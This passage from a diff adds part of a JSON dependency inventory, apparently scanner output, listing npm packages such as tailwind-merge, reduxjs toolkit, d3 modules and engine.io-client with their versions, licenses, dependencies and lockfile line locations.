+            "PURL": "pkg:npm/tailwind-merge@3.6.0",
+            "UID": "6060a25a363de4fe"
+          },
+          "Version": "3.6.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 3351,
+              "EndLine": 3360
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@reduxjs/toolkit@2.11.2",
+          "Name": "@reduxjs/toolkit",
+          "Identifier": {
+            "PURL": "pkg:npm/%40reduxjs/toolkit@2.11.2",
+            "UID": "5ceca12033620639"
+          },
+          "Version": "2.11.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@standard-schema/spec@1.1.0",
+            "@standard-schema/utils@0.3.0",
+            "immer@11.1.8",
+            "react-redux@9.2.0",
+            "react@19.2.6",
+            "redux-thunk@3.1.0",
+            "redux@5.0.1",
+            "reselect@5.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 597,
+              "EndLine": 622
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@socket.io/component-emitter@3.1.2",
+          "Name": "@socket.io/component-emitter",
+          "Identifier": {
+            "PURL": "pkg:npm/%40socket.io/component-emitter@3.1.2",
+            "UID": "f6b902b9e750bc08"
+          },
+          "Version": "3.1.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 897,
+              "EndLine": 902
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@standard-schema/spec@1.1.0",
+          "Name": "@standard-schema/spec",
+          "Identifier": {
+            "PURL": "pkg:npm/%40standard-schema/spec@1.1.0",
+            "UID": "3e09dcaaa708107e"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 903,
+              "EndLine": 908
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@standard-schema/utils@0.3.0",
+          "Name": "@standard-schema/utils",
+          "Identifier": {
+            "PURL": "pkg:npm/%40standard-schema/utils@0.3.0",
+            "UID": "7a1cbd0cd826aaeb"
+          },
+          "Version": "0.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 909,
+              "EndLine": 914
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-array@3.2.2",
+          "Name": "@types/d3-array",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-array@3.2.2",
+            "UID": "513361a1f9c46524"
+          },
+          "Version": "3.2.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1197,
+              "EndLine": 1202
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-color@3.1.3",
+          "Name": "@types/d3-color",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-color@3.1.3",
+            "UID": "ea1082dedd4ba162"
+          },
+          "Version": "3.1.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1203,
+              "EndLine": 1208
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-ease@3.0.2",
+          "Name": "@types/d3-ease",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-ease@3.0.2",
+            "UID": "f6ea94ac390a5eac"
+          },
+          "Version": "3.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1209,
+              "EndLine": 1214
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-interpolate@3.0.4",
+          "Name": "@types/d3-interpolate",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-interpolate@3.0.4",
+            "UID": "e3447e953736c522"
+          },
+          "Version": "3.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-color@3.1.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1215,
+              "EndLine": 1223
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-path@3.1.1",
+          "Name": "@types/d3-path",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-path@3.1.1",
+            "UID": "3ea28a1f60bf25eb"
+          },
+          "Version": "3.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1224,
+              "EndLine": 1229
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-scale@4.0.9",
+          "Name": "@types/d3-scale",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-scale@4.0.9",
+            "UID": "9e3b6c0a33e0e7f"
+          },
+          "Version": "4.0.9",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-time@3.0.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1230,
+              "EndLine": 1238
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-shape@3.1.8",
+          "Name": "@types/d3-shape",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-shape@3.1.8",
+            "UID": "f239c38694649945"
+          },
+          "Version": "3.1.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-path@3.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1239,
+              "EndLine": 1247
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-time@3.0.4",
+          "Name": "@types/d3-time",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-time@3.0.4",
+            "UID": "a2e2dadc49553f74"
+          },
+          "Version": "3.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1248,
+              "EndLine": 1253
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-timer@3.0.2",
+          "Name": "@types/d3-timer",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-timer@3.0.2",
+            "UID": "cfc255d6ac7a8743"
+          },
+          "Version": "3.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1254,
+              "EndLine": 1259
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/use-sync-external-store@0.0.6",
+          "Name": "@types/use-sync-external-store",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/use-sync-external-store@0.0.6",
+            "UID": "34b27282ff039c63"
+          },
+          "Version": "0.0.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1301,
+              "EndLine": 1306
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "asynckit@0.4.0",
+          "Name": "asynckit",
+          "Identifier": {
+            "PURL": "pkg:npm/asynckit@0.4.0",
+            "UID": "a5165f7ab04c7021"
+          },
+          "Version": "0.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1373,
+              "EndLine": 1378
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "call-bind-apply-helpers@1.0.2",
+          "Name": "call-bind-apply-helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/call-bind-apply-helpers@1.0.2",
+            "UID": "237eb6646ca2aa86"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1497,
+              "EndLine": 1509
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "combined-stream@1.0.8",
+          "Name": "combined-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/combined-stream@1.0.8",
+            "UID": "6e05dbc3fb4c1e0b"
+          },
+          "Version": "1.0.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "delayed-stream@1.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1540,
+              "EndLine": 1551
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "csstype@3.2.3",
+          "Name": "csstype",
+          "Identifier": {
+            "PURL": "pkg:npm/csstype@3.2.3",
+            "UID": "305fd13002c4301e"
+          },
+          "Version": "3.2.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1574,
+              "EndLine": 1580
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-array@3.2.4",
+          "Name": "d3-array",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-array@3.2.4",
+            "UID": "c5cc60eac970be74"
+          },
+          "Version": "3.2.4",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "internmap@2.0.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1581,
+              "EndLine": 1592
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-color@3.1.0",
+          "Name": "d3-color",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-color@3.1.0",
+            "UID": "bf8711d6c5a3893a"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1593,
+              "EndLine": 1601
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-ease@3.0.1",
+          "Name": "d3-ease",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-ease@3.0.1",
+            "UID": "a14691dba7c75ce4"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1602,
+              "EndLine": 1610
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-format@3.1.2",
+          "Name": "d3-format",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-format@3.1.2",
+            "UID": "457dd8ba54a2994e"
+          },
+          "Version": "3.1.2",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1611,
+              "EndLine": 1619
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-interpolate@3.0.1",
+          "Name": "d3-interpolate",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-interpolate@3.0.1",
+            "UID": "e4ad3f011d977f8a"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-color@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1620,
+              "EndLine": 1631
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-path@3.1.0",
+          "Name": "d3-path",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-path@3.1.0",
+            "UID": "c56690c9de31d173"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1632,
+              "EndLine": 1640
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-scale@4.0.2",
+          "Name": "d3-scale",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-scale@4.0.2",
+            "UID": "28cecfbd0a6d7d46"
+          },
+          "Version": "4.0.2",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-array@3.2.4",
+            "d3-format@3.1.2",
+            "d3-interpolate@3.0.1",
+            "d3-time-format@4.1.0",
+            "d3-time@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1641,
+              "EndLine": 1656
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-shape@3.2.0",
+          "Name": "d3-shape",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-shape@3.2.0",
+            "UID": "79de9868042bff1e"
+          },
+          "Version": "3.2.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-path@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1657,
+              "EndLine": 1668
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-time@3.1.0",
+          "Name": "d3-time",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-time@3.1.0",
+            "UID": "273395d481f61eb2"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-array@3.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1669,
+              "EndLine": 1680
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-time-format@4.1.0",
+          "Name": "d3-time-format",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-time-format@4.1.0",
+            "UID": "6e9d37d5689720af"
+          },
+          "Version": "4.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-time@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1681,
+              "EndLine": 1692
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-timer@3.0.1",
+          "Name": "d3-timer",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-timer@3.0.1",
+            "UID": "6d5e06b90656619d"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1693,
+              "EndLine": 1701
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "debug@4.4.3",
+          "Name": "debug",
+          "Identifier": {
+            "PURL": "pkg:npm/debug@4.4.3",
+            "UID": "af020a6fe67990a0"
+          },
+          "Version": "4.4.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "ms@2.1.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1702,
+              "EndLine": 1718
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "decimal.js-light@2.5.1",
+          "Name": "decimal.js-light",
+          "Identifier": {
+            "PURL": "pkg:npm/decimal.js-light@2.5.1",
+            "UID": "1beadbcd505890a"
+          },
+          "Version": "2.5.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1719,
+              "EndLine": 1724
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "delayed-stream@1.0.0",
+          "Name": "delayed-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/delayed-stream@1.0.0",
+            "UID": "717337b5b2a49f45"
+          },
+          "Version": "1.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1732,
+              "EndLine": 1740
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dunder-proto@1.0.1",
+          "Name": "dunder-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/dunder-proto@1.0.1",
+            "UID": "1b9ac91d4fc36847"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-errors@1.3.0",
+            "gopd@1.2.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1751,
+              "EndLine": 1764
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "engine.io-client@6.6.5",
+          "Name": "engine.io-client",
+          "Identifier": {
+            "PURL": "pkg:npm/engine.io-client@6.6.5",
+            "UID": "fc2f5165f6f63ad0"
+          },
+          "Version": "6.6.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@socket.io/component-emitter@3.1.2",
+            "debug@4.4.3",
+            "engine.io-parser@5.2.3",
+            "ws@8.20.1",
+            "xmlhttprequest-ssl@2.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1772,
+              "EndLine": 1784
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "engine.io-parser@5.2.3",
+          "Name": "engine.io-parser",
+          "Identifier": {
+            "PURL": "pkg:npm/engine.io-parser@5.2.3",
+            "UID": "411b2b7a3deaa674"
+          },
+          "Version": "5.2.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1785,
+              "EndLine": 1793
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-define-property@1.0.1",
+          "Name": "es-define-property",
+          "Identifier": {
+            "PURL": "pkg:npm/es-define-property@1.0.1",
+            "UID": "8c54b693f691a545"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1808,
+              "EndLine": 1816
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-errors@1.3.0",
+          "Name": "es-errors",
+          "Identifier": {
+            "PURL": "pkg:npm/es-errors@1.3.0",
+            "UID": "3fb5dc803b3182f2"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1817,
+              "EndLine": 1825
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-object-atoms@1.1.1",
+          "Name": "es-object-atoms",
+          "Identifier": {
+            "PURL": "pkg:npm/es-object-atoms@1.1.1",
+            "UID": "f7d12e0dc529ef6c"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1826,
+              "EndLine": 1837
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-set-tostringtag@2.1.0",
+          "Name": "es-set-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/es-set-tostringtag@2.1.0",
+            "UID": "d6cfe90e497c8f78"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "get-intrinsic@1.3.0",
+            "has-tostringtag@1.0.2",
+            "hasown@2.0.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1838,
+              "EndLine": 1852
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-toolkit@1.46.1",
+          "Name": "es-toolkit",
+          "Identifier": {
+            "PURL": "pkg:npm/es-toolkit@1.46.1",
+            "UID": "2b641558f2efb5db"
+          },
+          "Version": "1.46.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1853,
+              "EndLine": 1862
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "eventemitter3@5.0.4",
+          "Name": "eventemitter3",
+          "Identifier": {
+            "PURL": "pkg:npm/eventemitter3@5.0.4",
+            "UID": "a1f3147db64b7c30"
+          },
+          "Version": "5.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2068,
+              "EndLine": 2073
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "follow-redirects@1.16.0",
+          "Name": "follow-redirects",
+          "Identifier": {
+            "PURL": "pkg:npm/follow-redirects@1.16.0",
+            "UID": "8b2fc3658be1750c"
+          },
+          "Version": "1.16.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2164,
+              "EndLine": 2183
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "form-data@4.0.5",
+          "Name": "form-data",
+          "Identifier": {
+            "PURL": "pkg:npm/form-data@4.0.5",
+            "UID": "f7ff1399f0141b20"
+          },
+          "Version": "4.0.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "asynckit@0.4.0",
+            "combined-stream@1.0.8",
+            "es-set-tostringtag@2.1.0",
+            "hasown@2.0.3",
+            "mime-types@2.1.35"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2184,
+              "EndLine": 2199
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "function-bind@1.1.2",
+          "Name": "function-bind",
+          "Identifier": {
+            "PURL": "pkg:npm/function-bind@1.1.2",
+            "UID": "315c6fce555c3cda"
+          },
+          "Version": "1.1.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2256,
+              "EndLine": 2264
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-intrinsic@1.3.0",
+          "Name": "get-intrinsic",
+          "Identifier": {
+            "PURL": "pkg:npm/get-intrinsic@1.3.0",
+            "UID": "8d4b21133e52d6c7"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-define-property@1.0.1",
+            "es-errors@1.3.0",
+            "es-object-atoms@1.1.1",
+            "function-bind@1.1.2",
+            "get-proto@1.0.1",
+            "gopd@1.2.0",
+            "has-symbols@1.1.0",
+            "hasown@2.0.3",
+            "math-intrinsics@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2275,
+              "EndLine": 2298
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-proto@1.0.1",
+          "Name": "get-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/get-proto@1.0.1",
+            "UID": "f0494877d562e505"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "dunder-proto@1.0.1",
+            "es-object-atoms@1.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2299,
+              "EndLine": 2311
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "gopd@1.2.0",
+          "Name": "gopd",
+          "Identifier": {
+            "PURL": "pkg:npm/gopd@1.2.0",
+            "UID": "d0feef894b4565a"
+          },
+          "Version": "1.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2338,
+              "EndLine": 2349
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-symbols@1.1.0",
+          "Name": "has-symbols",
+          "Identifier": {
+            "PURL": "pkg:npm/has-symbols@1.1.0",
+            "UID": "649561058e98dbe3"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2357,
+              "EndLine": 2368
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-tostringtag@1.0.2",
+          "Name": "has-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/has-tostringtag@1.0.2",
+            "UID": "26e0538860c60b47"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "has-symbols@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2369,
+              "EndLine": 2383
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "hasown@2.0.3",
+          "Name": "hasown",
+          "Identifier": {
+            "PURL": "pkg:npm/hasown@2.0.3",
+            "UID": "7af16bf6b61cf45c"
+          },
+          "Version": "2.0.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2384,
+              "EndLine": 2395
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "immer@10.2.0",
+          "Name": "immer",
+          "Identifier": {
+            "PURL": "pkg:npm/immer@10.2.0",
+            "UID": "fc8cb971af11069"
+          },
+          "Version": "10.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2423,
+              "EndLine": 2432
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "immer@11.1.8",
+          "Name": "immer",
+          "Identifier": {
+            "PURL": "pkg:npm/immer@11.1.8",
+            "UID": "c71bbb5767ddf96"
+          },
+          "Version": "11.1.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 623,
+              "EndLine": 632
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "internmap@2.0.3",
+          "Name": "internmap",
+          "Identifier": {
+            "PURL": "pkg:npm/internmap@2.0.3",
+            "UID": "a9687824cf0573f9"
+          },
+          "Version": "2.0.3",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2443,
+              "EndLine": 2451
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "math-intrinsics@1.1.0",
+          "Name": "math-intrinsics",
+          "Identifier": {
+            "PURL": "pkg:npm/math-intrinsics@1.1.0",
+            "UID": "ad87b87fa81d1040"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2876,
+              "EndLine": 2884
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-db@1.52.0",
+          "Name": "mime-db",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-db@1.52.0",
+            "UID": "e377c708e9a81d03"
+          },
+          "Version": "1.52.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2885,
+              "EndLine": 2893
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-types@2.1.35",
+          "Name": "mime-types",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-types@2.1.35",
+            "UID": "87ad6f93eec1c571"
+          },
+          "Version": "2.1.35",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "mime-db@1.52.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2894,
+              "EndLine": 2905
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "motion-dom@12.38.0",
+          "Name": "motion-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/motion-dom@12.38.0",
+            "UID": "ff119b4383ae094f"
+          },
+          "Version": "12.38.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "motion-utils@12.36.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2922,
+              "EndLine": 2930
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "motion-utils@12.36.0",
+          "Name": "motion-utils",
+          "Identifier": {
+            "PURL": "pkg:npm/motion-utils@12.36.0",
+            "UID": "28e30b4820ce834c"
+          },
+          "Version": "12.36.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2931,
+              "EndLine": 2936
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
